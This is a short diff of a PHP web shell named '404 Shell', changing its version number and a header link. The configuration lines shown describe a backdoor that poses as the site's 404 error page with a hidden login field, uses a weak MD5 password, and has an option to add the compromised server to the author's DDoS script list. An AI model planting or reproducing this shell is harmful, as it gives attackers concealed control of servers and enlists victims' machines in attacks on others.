@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 1.0;
+$version            = 1.1;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = false; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -639,7 +639,7 @@ function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writa
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-      <a class="navbar-brand" href="https://gist.github.com/codelyfe/3e87bbe10b3a3ab6fbfc188a6e172c53" style="font-size:10px">404 Shell | With Bootstrap - Version ' . $version . '</a>
+      <a class="navbar-brand" href="#" style="font-size:10px">404 Shell | With Bootstrap - v' . $version . '</a>
     </div>
 
     <!-- Collect the nav links, forms, and other content for toggling -->
